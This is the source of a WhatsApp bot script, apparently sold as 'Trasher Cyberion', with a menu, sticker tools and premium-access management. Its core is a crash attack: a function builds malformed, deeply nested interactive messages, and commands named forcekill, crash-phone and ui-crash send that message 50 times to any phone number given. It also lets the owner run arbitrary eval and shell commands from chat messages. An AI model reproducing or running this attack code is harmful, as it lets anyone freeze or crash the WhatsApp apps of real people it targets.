//BASE BY KAGENOU
//DEV GHOSTNETIZEN
//NAMA: DIMAS
//TRASHER CYBERTRON V1.0
//TELEGRAM: t.me/ghostnetizen
//WHATSAPP: +6289602541152
require("./config")
const {
smsg,
getGroupAdmins,
formatp,
h2k,
tanggal,
formatDate,
getTime,
isUrl,
sleep,
clockString,
msToDate,
sort,
toNumber,
enumGetKey,
runtime,
fetchJson,
getBuffer,
jsonformat,
delay,
format,
logic,
generateProfilePicture,
parseMention,
getRandom,
pickRandom,
reSize
} = require("./lib/myfunction")
//=================================================//
const {
downloadContentFromMessage,
emitGroupParticipantsUpdate,
emitGroupUpdate,
generateWAMessageContent,
generateWAMessage,
makeInMemoryStore,
prepareWAMessageMedia,
generateWAMessageFromContent,
MediaType,
areJidsSameUser,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
GroupMetadata,
initInMemoryKeyStore,
getContentType,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
proto,
WAGroupMetadata,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WAGroupInviteMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WA_DEFAULT_EPHEMERAL,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
GroupSettingChange,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
fetchLatestBaileysVersion,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys")
//=================================================//
const {
default: makeWaSocket,
useMultiFileAuthState
} = require("@whiskeysockets/baileys")
//=================================================//
const wkwkwk = "./global/message/data/ban/banned.json";
const axios = require("axios")
const os = require("os").cpus().length
const util = require("util")
const fetch = require("node-fetch")
const speed = require("performance-now")
const pino = require('pino')
const moment = require("moment-timezone")
const {
spawn: spawn,
exec
} = require("child_process")
const {
performance
} = require("perf_hooks")
const chalk = require("chalk")
const FormData = require("form-data")
const ms = toMs = require("ms")
const yts = require("yt-search")
const crypto = require("crypto")
const tls = require("tls")
const GnXMp3 = require('./lib/Mp3.js')
const net = require("net")
const http2 = require("http2")
const cluster = require("cluster")
const path = require('path');
const {
color
} = require("./lib/color")
const fs = require("fs")
const {
basename
} = require("path")
//=================================================//
const {
addPremiumUser,
getPremiumExpired,
getPremiumPosition,
expiredCheck,
checkPremiumUser,
getAllPremiumUser,
} = require("./lib/premiun")
const {
tiktokDl,
ytdl,
} = require('./lib/downloader')
//=================================================//
async function EncryptJs2(code) {
    let res = await fetch(`https://ai.xterm.codes/api/tools/js-protector?code=${code}&key=keymu`);
    let jsonResponse = await res.json(); // Mendapatkan respons JSON
    return jsonResponse.data; // Mengembalikan bagian data dari respons
}
//=================================================//
module.exports = async (GnX, m, chatUpdate, store) => {//fre//freze
try {
var body = (//fre//freze
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption ://fre//freze
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text ://fre//freze
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id ://fre//freze
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "messageContextInfo" ?
m.message.buttonsResponseMessage?.selectedButtonId ||
m.message.listResponseMessage?.singleSelectReply.selectedRowId ||//fre//freze
m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
m.text :
""
);
//=================================================//
const {
groupMembers
} = m
var budy = (typeof m.text == "string" ? m.text : "")
const prefixRegex = /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/;
const botNumber = await GnX.decodeJid(GnX.user.id)
if (Object.keys(db.data.settings).includes(botNumber) && Object.keys(db.data.settings[botNumber]).includes("setPrefix") && db.data.settings[botNumber].setPrefix == "multi") {
var thePrefix = "MULTI"
var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
var isCmd = body.startsWith(prefix)
var command = isCmd ? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : ""
} else if (Object.keys(db.data.settings).includes(botNumber) && Object.keys(db.data.settings[botNumber]).includes("setPrefix") && db.data.settings[botNumber].setPrefix == "no") {
var thePrefix = "NO"
var prefix = ""
var isCmd = body.startsWith(prefix)
var command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
} else if (Object.keys(db.data.settings).includes(botNumber) && Object.keys(db.data.settings[botNumber]).includes("setPrefix") && db.data.settings[botNumber].setPrefix == "all") {
var thePrefix = "ALL"
var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
var isCmd = body.startsWith(prefix)
var command = body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase()
} else {
var thePrefix = "MULTI"
var prefix = body.startsWith("#") ? "#" : body.startsWith("!") ? "!" : body.startsWith("/") ? "/" : body.startsWith("?") ? "?" : "."
var isCmd = body.startsWith(prefix)//hard
var command = isCmd ? body.replace(prefix, "").trim().split(/ +/).shift().toLowerCase() : ""
}
const content = JSON.stringify(m.message)
const args = body.trim().split(/ +/).slice(1)
const pushname = m.pushName || "No Name"
const text = q = args.join(" ")//hard
const fatkuns = (m.quoted || m)
const quoted = (fatkuns.mtype == "buttonsMessage") ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == "templateMessage") ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == "product") ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ""
const qmsg = (quoted.msg || quoted)
const isMedia = /image|video|sticker|audio/.test(mime)
const input = m.isMention && m.quoted && m.mentionedJid.includes(m.quoted.sender) ? m.mentionedJid : m.isMention && m.quoted ? [...m.mentionedJid, m.quoted.sender] : m.isMention ? m.mentionedJid : m.quoted ? Array(m.quoted.sender) : text !== "" && (text.trim().includes("08") || text.trim().includes("+62") || text.trim().includes("628")) ? text.split("+62").filter((x) => (x !== "" && x.length >= 11 && !isNaN(parseInt(x.replace(new RegExp("[()+-/ +/]", "gi"), ""))))).map((x) => x.trim().startsWith("8") ? ("+62" + x.trim()) : x.trim()).join(" ").split(" ").filter((x) => (x.length >= 11 && !isNaN(parseInt(x.replace(new RegExp("[()+-/ +/]", "gi"), ""))))).map((x) => x.startsWith("08") ? parseInt(x.replace("08", "628")) : parseInt(x.replace(new RegExp("[()+-/ +/]", "gi"), ""))).map((x) => (x + "@s.whatsapp.net")) : text !== "" && !isNaN(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), ""))) && util.format(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), ""))).length >= 8 && util.format(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), ""))).length <= 15 ? Array(parseInt(text.replace(new RegExp("[()+-/ +/]", "gi"), "")) + "@s.whatsapp.net") : []

//User
const numberQuery = text.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net"
const mentionByTag = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
const mentionByReply = m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || "" : ""
const Inputo = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
const from = m.key.remoteJid
const itsMe = m.sender == botNumber ? true : false
const orgkaya = JSON.parse(fs.readFileSync("./data/premium.json"))
const kontributor = JSON.parse(fs.readFileSync("./data/owner.json"))
const contacts = JSON.parse(fs.readFileSync("./data/contacts.json"))
const isContacts = contacts.includes(m.sender)
const isCreator = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
const isDeveloper = [botNumber].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
const isPremium = isDeveloper || isCreator || checkPremiumUser(m.sender, orgkaya);

// Group
const groupMetadata = m.chat.endsWith("@g.us") ? (await GnX.groupMetadata(m.chat).catch(e => {})) : {}
const groupName = Object.keys(groupMetadata).length > 0 ? groupMetadata.subject : ""
const participants = Object.keys(groupMetadata).length > 0 ? groupMetadata.participants : ""
const groupAdmins = Object.keys(groupMetadata).length > 0 ? (await getGroupAdmins(participants)) : ""
const isBotAdmins = Object.keys(groupMetadata).length > 0 ? groupAdmins.includes(botNumber) : false
const isAdmins = Object.keys(groupMetadata).length > 0 ? groupAdmins.includes(m.sender) : false
const isGroup = m.chat.endsWith("@g.us")
const groupOwner = Object.keys(groupMetadata).length > 0 ? groupMetadata.owner : ""
const isGroupOwner = Object.keys(groupMetadata).length > 0 ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false

//=================================================//
const isText = ["extendedTextMessage", "conversation"].includes(m.mtype)
const isImage = ["imageMessage"].includes(m.mtype)
const isVideo = ["videoMessage"].includes(m.mtype)
const isSticker = ["stickerMessage"].includes(m.mtype)
const isAudio = ["audioMessage"].includes(m.mtype) && !(m.message[m.mtype]?.ptt)
const isVoice = ["audioMessage"].includes(m.mtype) && !!(m.message[m.mtype]?.ptt)
const isViewOnce = ["viewOnceMessageV2", "viewOnceMessage"].includes(m.mtype)
const isContact = ["contactMessage", "contactsArrayMessage"].includes(m.mtype)
const isLocation = ["locationMessage"].includes(m.mtype)
const isDocument = ["documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
const isProtocol = ["protocolMessage"].includes(m.mtype)
const isPollUpdate = ["pollUpdateMessage"].includes(m.mtype)
const isPollCreation = ["pollCreationMessage"].includes(m.mtype)
const isButtonList = ["interactiveResponseMessage"].includes(m.mtype)
const isButtonReply = ["templateButtonReplyMessage"].includes(m.mtype)
const isAllMedia = ["imageMessage", "videoMessage", "stickerMessage", "audioMessage", "viewOnceMessageV2", "viewOnceMessage", "contactMessage", "contactsArrayMessage", "locationMessage", "documentMessage", "documentWithCaptionMessage"].includes(m.mtype)
const isQuotedViewOnce = m.mtype === "extendedTextMessage" && content.includes("viewOnceMessage")
//=================================================//
try {
const isNumber = x => typeof x === "number" && !isNaN(x)
const user = db.data.users[m.sender]
if (typeof user !== "object") db.data.users[m.sender] = {}
const chats = db.data.chats[m.chat]
if (typeof chats !== "object") db.data.chats[m.chat] = {}
if (user) {
if (!user.premium) user.premiumTime = 0
if (!("premium" in user)) user.premium = false
} else db.data.users[m.sender] = {
premiumTime: 0,
name: m.name,
premium: false
}
//=================================================//

  //infoo
const setting = db.data.settings[botNumber]
if (typeof setting !== "object") db.data.settings[botNumber] = {}
if (setting) {
if (!isNumber(setting.status)) setting.status = 0
if (!("autobio" in setting)) setting.autobio = false
if (!("autoread" in setting)) setting.autoread = false
if (!("autoTyping" in setting)) setting.autoTyping = false
if (!("autoRecord" in setting)) setting.autoRecord = true
if (!("public" in setting)) setting.public = false
if (!("setPrefix" in setting)) setting.setPrefix = "multi" //multi, no, all
if (!("onlygrub" in setting)) setting.onlygrub = false
} else db.data.settings[botNumber] = {
status: 0,
stock: 10,
autobio: true,
autoTyping: false,
autoRecord: true,
public: false,
setPrefix: "all", //multi, no, all
onlygrub: false,
autoread: true,
menuType: "buttonImage" //> buttonImage
}

} catch (err) {
console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ ERROR ]"), err)
}
 //=================================================//
 //IMAGE
const GnXThM = fs.readFileSync(`./global/message/data/image/ghostpoto.jpg`)
const CotGnX = fs.readFileSync(`./data/Cot.js`)
 //=================================================//
 //REPLY
 const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363360961817165@newsletter`,
newsletterName: `TrasherCyberion`,
jpegThumbnail: "",
caption: `Powered By Ghostnetizen`,
inviteExpiration: Date.now() + 1814400000
}
}}

const ghostreply = async (teks) => {
return GnX.sendMessage(m.chat, {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(from ? {
remoteJid: "@s.whatsapp.net"
} : {})
},
text: teks
}, {
quoted: qchanel
})
}
const ayamreply = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(from ? {
remoteJid: "0@s.whatsapp.net"
} : {})
},
"message": {
"orderMessage": {
"orderId": "594071395007984",
"itemCount": 999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `ᴄᴏᴍᴍᴀɴᴅ: ${prefix + command}`,
"orderTitle": "Kontol",
"sellerJid": "601118979616@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000",
"totalCurrencyCode": "IDR"
}
}
}
const doc = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363288161933050@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `ᴄᴏᴍᴍᴀɴᴅ: ${prefix + command}`,
inviteExpiration: Date.now() + 1814400000
}
}}
//=================================================//
//DATA FUNCTION BUG
/*/
Func nya biar gw yg isi, lu" pada buat menu nya gc di bawah
/*/

async function MpMSqL(target) {
      let sections = [];

      for (let i = 0; i < 10; i++) {
        let largeText = "_*⏤̽͢𝐓𝐫𝐚𝐬𝐡𝐞𝐫 ↯ 𝘾𝙮͛𝙗𝙚𝙧𝙞𝙤𝙣͢*_";

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "꧀∫🐲​᭄͛͢𝐆𝐧͛𝐗 ↯ 𝐁͓̽𝐔͢𝐆ꦽ 🐉", 
        sections: sections,
      };

      let msg = generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [target, "13135550002@s.whatsapp.net"],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                  text: "_*⏤̽͢𝐓𝐫𝐚𝐬𝐡𝐞𝐫 ↯ 𝘾𝙮͛𝙗𝙚𝙧𝙞𝙤𝙣͢*_",
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                  subtitle: "_*⏤̽͢𝐓𝐫𝐚𝐬𝐡𝐞𝐫 ↯ 𝘾𝙮͛𝙗𝙚𝙧𝙞𝙤𝙣͢*_",
                  hasMediaAttachment: false, // No media to focus purely on data overload
                }),
                nativeFlowMessage:
                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                        {
                                                name: "single_select",

                        buttonParamsJson: "JSON.stringify(listMessage)",

                      }, 

                      {

                        name: "payment_method",

                        buttonParamsJson: "JSON.stringify(listMessage)",

                      },

                      {

                        name: "call_permission_request",

                        buttonParamsJson: "JSON.stringify(listMessage)",

                      },

                      {

                        name: "single_select",

                        buttonParamsJson: "JSON.stringify(listMessage)",

                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                     ],
                  }),
              }),
            },
          },
        },
        { userJid: target }
      );

      await GnX.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id,
      });
    }
 //=================================================//
//Status
if (!db.data.settings[botNumber].public && !isCreator) return

//REACTION\\
const reaction = async (jidss, emoji) => {
GnX.sendMessage(jidss, {
react: {
text: emoji,
key: m.key
}
})
}

//=================================================//
// CONSOLE \\
//=================================================//
const command_log = [chalk.whiteBright("├"), chalk.keyword("red")(`[ ${m.isGroup? "GROUP" : "PRIVATE"} ]`), chalk.whiteBright(body == "" && isImage ? "image" : body == "" && isVideo ? "video" : body == "" && isViewOnce ? "view once" : body == "" && isDocument ? "document" : isSticker ? "sticker" : isAudio ? "audio" : isVoice ? "voice" : isContact ? "contact" : isLocation ? "location" : isProtocol ? "delete message" : isPollUpdate ? "update poll" : isPollCreation ? "creation poll" : body), chalk.greenBright("from"), chalk.yellow(m.pushName)]
if (isGroup) {
command_log.push(chalk.greenBright("in"))
command_log.push(chalk.yellow(groupName))
}
if (isImage || isVideo || isViewOnce || isDocument || isSticker || isAudio || isVoice || isContact || isLocation || isProtocol || isPollUpdate || isPollCreation || isText || isButtonList || isButtonReply) console.log(...command_log)

//=================================================//
// STATUS \\
function runtime(seconds) {
seconds = Number(seconds);
const d = Math.floor(seconds / (3600 * 24)); // Hitung hari
const h = Math.floor((seconds % (3600 * 24)) / 3600); // Hitung jam
const m = Math.floor((seconds % 3600) / 60); // Hitung menit

// Format string hasil
return `${d > 0 ? `${d} hari ` : ""}${h > 0 ? `${h} jam ` : ""}${m > 0 ? `${m} menit` : ""}`.trim();
}
//=================================================//
switch (command) {
case 'menu':{
GnX.sendMessage(m.chat, {
image: { url: `https://files.catbox.moe/dzwf33.jpg`},
caption: `
_*⎘ Hai : ${pushname} 🔥*_
_*⎘ Name : thunder*_
_*⎘ Owner : Pentra*_
_*⎘ Version : 1.0*_
_*⎘ Developer : Pentradc*_
_*⎘ Prefix : Multi ⚡*_
_*⎘ © : Cyberion Team ✨*_
_*▰▱▰▱▰▱▰▱▰▱▰▱▰*_
_*☇ AKSES MENU*_
_*➛ addakses < number/@ >*_
_*➛ delakses < number/@ >*_

_*☇ BUG MENU*_
_*➛ forcekill < number >*_
_*➛ killing < number >*_
_*➛ hardui < number >*_
_*➛ crash-phone < number >*_
_*➛ ui-crash < number >*_
_*➛ thunderkill < number >*_

_*☇ OWNER MENU*_
_*➛ hidetag < teks >*_
_*➛ eval < reply message >*_
_*➛ encrypt < reply/teks >*_
_*➛ play <nama lagu>*_
_*➛ bratvid <sticker>*_

☇ *THANKS TO*
_*➛ Pentradc ( dev thunder )*_
_*➛ Allah swt ( my god )*_
_*➛ orang tua ( support )*_ 
_*➛ all team*_ 
_*➛ all pembeli script❤*_
`,
gifPlayback: false,
}, {
quoted: qchanel
})
}
break

//=================================================//
case "addakses": {
  if (!isCreator) return ghostreply(mess.owner);
  if (args.length < 2)
 return ghostreply(`Example : .addakses 628xx 30d`);  
  if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
 addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
 ghostreply("Sukses menambahkan user premium");
   } else {
 addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
  ghostreply("Sukses Via Nomer");
  await sleep(2000);
 gnx.sendMessage(
args[0] + "@s.whatsapp.net",
{
text: `Kamu sekarang adalah Anggota Premium`
},
 {
  quoted: qchanel
 }
   );
 }
  }
   break;
   
//=================================================//
case "delakses": {
   if (!isCreator) return ghostreply(mess.owner);
  if (args.length < 1) return ghostreply(`Example : .delakses 628xx`);
  if (m.mentionedJid.length !== 0) {
 for (let i = 0; i < m.mentionedJid.length; i++) {
  let mentionedPremiumIndex = orgkaya.findIndex(premium => premium.id === m.mentionedJid[i]);
  if (mentionedPremiumIndex !== -1) {
orgkaya.splice(mentionedPremiumIndex, 1);
}
   }
fs.writeFileSync("./data/premium.json", JSON.stringify(orgkaya));
ghostreply("Sukses Delete user premium");
 } else {
let targetNumber = args[0] + "@s.whatsapp.net";
  let targetPremiumIndex = orgkaya.findIndex(premium => premium.id === targetNumber);
 if (targetPremiumIndex !== -1) {
   orgkaya.splice(targetPremiumIndex, 1);
   fs.writeFileSync("./data/premium.json", JSON.stringify(orgkaya));
ghostreply("Sukses Via Nomer");
await sleep(2000)
   gnx.sendMessage(
 targetNumber,
{
text: `Keanggotaan premium Anda telah dihapus.`
  },
   {
quoted: ghostreply
 }
 );
   } else {
ghostreply("Entitas premium tidak ditemukan");
   }
  }
   }
   break;
//=================================================//
case 'forcekill':
case 'thunderkill': {
  if (!isPremium) return ghostreply(`Hanya user premium dan owner saja`)
  if (!q) return ghostreply(`Example : .${command} 628xxx`)
  let dimasgntng = q.replace(/[^0-9]/g, "")
if (dimasgntng.startsWith('0')) return ghostreply(`Example : .${command} 628xxx`)
let target = dimasgntng + '@s.whatsapp.net'
await ghostreply(`Proses mengirim bug ke ${target} mohon tunggu sebentar`)
   for (let i = 0; i < 50; i++) {
    await MpMSqL(target)
}
await ghostreply(`
Sukses kirim bug ke ${target}, mohon jeda 5mnt agar bot tidak terkena band
`)
}
break

case 'forcekill':
case 'ghostkill':
case 'killing':
case 'hardui':
case 'crash-phone':
case 'ui-crash':{
  if (!isPremium) return ghostreply(`Hanya user premium dan owner saja`)
  if (!q) return ghostreply(`Example : .${command} 628xxx`)
  let dimasgntng = q.replace(/[^0-9]/g, "")
if (dimasgntng.startsWith('0')) return ghostreply(`Example : .${command} 628xxx`)
let target = dimasgntng + '@s.whatsapp.net'
await ghostreply(`Proses mengirim bug ke ${target} mohon tunggu sebentar`)
   for (let i = 0; i < 50; i++) {
    await MpMSqL(target)
}
await ghostreply(`
Sukses kirim bug ke ${target}, mohon jeda 5mnt agar bot tidak terkena band
`)
}
break

case "bratvid": {
    if (!text) return ghostreply("[❗] Input teks tidak ditemukan! Kirim perintah dengan format: .bratvid <teks>");
    try {
        let brat = `https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`;
        let response = await axios.get(brat, { responseType: "arraybuffer" });
        let videoBuffer = response.data;
        let stickerBuffer = await GnX.sendVideoAsSticker(m.chat, videoBuffer, qchanel, {
            packname: "Stiker By",
            author: "Dimas Is Here",
        });
        console.log("Stiker berhasil dibuat:", stickerBuffer);
    } catch (err) {
        console.error("Error:", err);
        ghostreply("[❗] Maaf, terjadi kesalahan saat mencoba membuat stiker video. Silakan coba lagi.");
    }
}
break;

case 'hidetag': {
if (!isCreator) return ghostreply(mess.owner)
if (!m.isGroup) return m.reply('𝙄𝙣 𝙜𝙧𝙪𝙥 𝙡𝙤𝙡... 🐉')
GnX.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted:qchanel })
}
break

case "sticker":
case "stiker":
case "s": {
if (!quoted) return ghostreply(`𝙍𝙚𝙥𝙡𝙮 𝙫𝙞𝙙𝙚𝙤/𝙛𝙤𝙩𝙤!! 🐉`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await GnX.sendImageAsSticker(m.chat, media, qchanel, {
packname: global.packname,
author: global.author
})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return ghostreply("𝙈𝙖𝙭 10 𝙨𝙚𝙘𝙤𝙣𝙙!! 🐉")
let media = await quoted.download()
let encmedia = await GnX.sendVideoAsSticker(m.chat, media, qchanel, {
packname: global.packname,
author: global.author
})
} else {
return ghostreply(`𝙎𝙚𝙣𝙙 𝙫𝙞𝙙𝙚𝙤/𝙛𝙤𝙩𝙤 𝙖𝙣𝙙 𝙘𝙖𝙥𝙩𝙞𝙤𝙣, 𝙢𝙖𝙭 𝙙𝙪𝙧𝙖𝙩𝙞𝙤𝙣 1-9 𝙨𝙚𝙘𝙤𝙣𝙙!! 🐉`)
}
}
break
//=================================================//
//END
default:
if (budy.startsWith("=>")) {
if (!isCreator) return zreply(mess.owner)

function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return zreply(bang)
}
try {
zreply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
zreply(String(e))
}
}
//=================================================//
if (budy.startsWith(">")) {
if (!isCreator) return zreply(mess.owner)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== "string") evaled = require("util").inspect(evaled)
await zreply(evaled)
} catch (err) {
await zreply(String(err))
}
}
//=================================================//
if (budy.startsWith("$")) {
if (!isCreator) return zreply(mess.owner)
exec(budy.slice(2), (err, stdout) => {
if (err) return zreply(`${err}`)
if (stdout) return zreply(`${stdout}`)
})
}
}
} catch (err) {
const handleError = async () => {
console.log(require("util").format(err));
};
handleError();
}
}
//=================================================//
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.whiteBright("├"), chalk.keyword("red")("[ UPDATE ]"), __filename)
delete require.cache[file]
require(file)
})